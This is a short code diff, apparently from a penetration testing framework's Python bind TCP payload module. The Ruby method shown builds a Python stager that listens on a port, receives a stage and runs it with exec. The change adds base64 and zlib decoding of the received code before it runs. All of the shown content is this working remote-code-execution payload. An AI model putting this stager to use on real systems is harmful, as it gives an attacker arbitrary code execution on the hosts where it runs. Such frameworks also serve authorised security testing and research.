@@ -41,7 +41,7 @@ module Payload::Python::BindTcp
 
   def generate_bind_tcp(opts={})
     # Set up the socket
-    cmd  = "import socket,struct\n"
+    cmd  = "import zlib,base64,socket,struct\n"
     cmd << "b=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
     cmd << "b.bind(('0.0.0.0',#{opts[:port]}))\n"
     cmd << "b.listen(1)\n"
@@ -51,7 +51,7 @@ module Payload::Python::BindTcp
     cmd << "d=s.recv(l)\n"
     cmd << "while len(d)<l:\n"
     cmd << "\td+=s.recv(l-len(d))\n"
-    cmd << "exec(d,{'s':s})\n"
+    cmd << "exec(zlib.decompress(base64.b64decode(d)),{'s':s})\n"
 
     py_create_exec_stub(cmd)
   end
